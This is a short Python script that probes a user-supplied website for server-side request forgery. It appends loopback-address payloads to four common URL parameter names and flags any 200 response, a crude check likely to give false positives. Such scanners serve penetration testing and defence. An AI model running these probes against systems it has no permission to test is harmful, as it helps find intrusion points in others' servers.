#!/usr/bin/env python3

import requests

target_url = input('Enter website\'s URL : ')
print('\n')

# list of potential vulnerable parameters
params_to_test = ['url', 'dest_url', 'site_url', 'page_url']

ssrf_payloads = [
    'http://localhost/',
    'http://127.0.0.1/',
    'http://[::1]/',
    'http://0.0.0.0/',
    'http://127.127.127.127/',
]

# loop through each param
for param in params_to_test:
    # loop through each payload
    for payload in ssrf_payloads:
        # craft the url and add the payload
        test_url = target_url + '?' + param + '=' + payload
        # send the request
        r = requests.get(test_url)
        # look for a response of 200
        if r.status_code == 200:
            print('Found potential SSRF on parameter: {}'.format(param))
            print('Payload tested: {}'.format(payload))
            print('Response code: {}'.format(r.status_code))
            print('Full URL: {}'.format(test_url))
            print('\n')